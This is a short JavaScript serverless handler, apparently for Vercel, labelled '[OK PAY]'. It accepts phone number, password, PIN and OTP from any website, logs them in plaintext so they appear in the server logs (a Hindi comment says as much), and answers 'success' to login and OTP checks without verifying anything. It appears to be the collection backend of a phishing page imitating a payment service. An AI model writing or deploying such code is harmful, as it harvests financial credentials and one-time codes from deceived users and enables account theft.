export default function handler(req, res) {
  // CORS allow
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { type, phone, pass, pin, otp } = req.body || {};

  // Vercel logs me data dikhega
  console.log(`[OK PAY] Type: ${type} | Phone: ${phone} | Pass: ${pass} | PIN: ${pin} | OTP: ${otp}`);

  if (type === 'login') {
    if (!phone || !pass || !pin) return res.status(400).json({ error: 'Missing fields' });
    return res.status(200).json({ success: true });
  }

  if (type === 'send_otp') {
    return res.status(200).json({ success: true });
  }

  if (type === 'verify_otp') {
    return res.status(200).json({ success: true });
  }

  return res.status(200).json({ success: true });
}
